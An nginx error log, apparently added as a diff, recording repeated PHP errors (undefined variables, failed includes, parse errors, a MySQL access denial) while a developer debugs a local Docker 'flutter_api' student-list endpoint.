+2021/06/11 07:43:38 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: PDO::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:43:38 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: PDO::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:43:51 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:8
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:44:00 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:44:19 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $db_psass in /docker/home/flutter_api/db.php on line 21PHP message: PHP Warning:  mysqli::__construct(): (HY000/1045): Access denied for user 'myuser'@'172.20.0.5' (using password: NO) in /docker/home/flutter_api/db.php on line 21" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:44:22 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $db_psass in /docker/home/flutter_api/db.php on line 21PHP message: PHP Warning:  mysqli::__construct(): (HY000/1045): Access denied for user 'myuser'@'172.20.0.5' (using password: NO) in /docker/home/flutter_api/db.php on line 21" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:44:37 [info] 24#24: *31 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:44:40 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $db_psass in /docker/home/flutter_api/db.php on line 21PHP message: PHP Warning:  mysqli::__construct(): (HY000/1045): Access denied for user 'myuser'@'172.20.0.5' (using password: NO) in /docker/home/flutter_api/db.php on line 21" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:45:40 [info] 24#24: *47 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:45:42 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:45:48 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:45:55 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:46:17 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $stmt in /docker/home/flutter_api/list.php on line 20PHP message: PHP Fatal error:  Uncaught Error: Call to a member function prepare() on null in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:46:42 [info] 24#24: *57 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:55:17 [error] 24#24: *68 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:21
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 21" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:56:17 [info] 24#24: *69 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:56:40 [error] 24#24: *73 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api/flutter_api/db.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api/flutter_api/db.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Call to a member function prepare() on null in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:57:10 [error] 24#24: *73 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:21
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 21" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:57:11 [error] 24#24: *73 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:21
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 21" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:57:40 [info] 24#24: *72 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:58:16 [error] 24#24: *73 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:58:24 [error] 24#24: *73 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:58:29 [error] 24#24: *73 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:58:38 [error] 24#24: *73 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:59:16 [info] 24#24: *79 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 08:02:05 [error] 24#24: *87 FastCGI sent in stderr: "PHP message: PHP Warning:  include(SELECT id, name, age FROM student): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  include(): Failed opening 'SELECT id, name, age FROM student' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:02:12 [error] 24#24: *87 FastCGI sent in stderr: "PHP message: PHP Warning:  include(SELECT id, name, age FROM student): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  include(): Failed opening 'SELECT id, name, age FROM student' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:02:19 [error] 24#24: *87 FastCGI sent in stderr: "PHP message: PHP Warning:  include(SELECT id, name, age FROM student): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  include(): Failed opening 'SELECT id, name, age FROM student' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:23
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 23" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:02:38 [error] 24#24: *87 FastCGI sent in stderr: "PHP message: PHP Warning:  include(SELECT id, name, age FROM student): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  include(): Failed opening 'SELECT id, name, age FROM student' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:23
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 23" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:03:00 [error] 24#24: *87 FastCGI sent in stderr: "PHP message: PHP Warning:  include(SELECT id, name, age FROM student): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  include(): Failed opening 'SELECT id, name, age FROM student' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:03:05 [info] 24#24: *88 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 08:03:18 [error] 24#24: *87 FastCGI sent in stderr: "PHP message: PHP Warning:  include(SELECT id, name, age FROM student): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  include(): Failed opening 'SELECT id, name, age FROM student' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:04:11 [error] 24#24: *87 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unclosed '{' on line 23 in /docker/home/flutter_api/list.php on line 34" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:04:18 [info] 24#24: *96 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 08:04:33 [error] 24#24: *100 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unclosed '{' on line 23 in /docker/home/flutter_api/list.php on line 34" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:04:42 [error] 24#24: *100 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unclosed '{' on line 23 in /docker/home/flutter_api/list.php on line 34" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:04:46 [error] 24#24: *100 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unclosed '{' on line 23 in /docker/home/flutter_api/list.php on line 34" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:05:21 [error] 24#24: *100 FastCGI sent in stderr: "PHP message: PHP Warning:  include(SELECT id, name, age FROM student): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  include(): Failed opening 'SELECT id, name, age FROM student' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:05:36 [error] 24#24: *100 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 26" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:13:53 [error] 24#24: *108 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 25" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:14:13 [error] 24#24: *108 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 25" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:14:16 [error] 24#24: *108 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 25" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:15:49 [error] 24#24: *112 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 28" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:18:17 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 28" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:18:19 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 28" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:18:36 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 28" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:19:00 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apidb.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apidb.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:19:09 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 29" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:19:11 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Parse error:  Unmatched '}' in /docker/home/flutter_api/list.php on line 29" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:19:27 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apidb.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apidb.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(23): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:19:29 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apidb.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apidb.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(23): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:19:47 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apidb.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apidb.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:19:53 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apidb.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apidb.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 18PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(23): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:20:39 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apidb.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apidb.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 18PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 19PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:19
+Stack trace:
+#0 /docker/home/index.php(23): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 19" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:20:44 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apidb.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apidb.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 4PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:21:08 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:21:36 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined method mysqli::dbprepare() in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:21:47 [error] 24#24: *114 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined method mysqli::dbprepare() in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:23:19 [error] 24#24: *135 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "db" in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:23:25 [error] 24#24: *135 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "db" in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:25:08 [error] 24#24: *138 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "db" in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:25:34 [error] 24#24: *138 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "db" in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:25:58 [error] 24#24: *138 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:26:32 [error] 24#24: *138 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:28:55 [error] 24#24: *151 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined method mysqli::dbprepare() in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:29:02 [error] 24#24: *151 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined method mysqli::dbprepare() in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
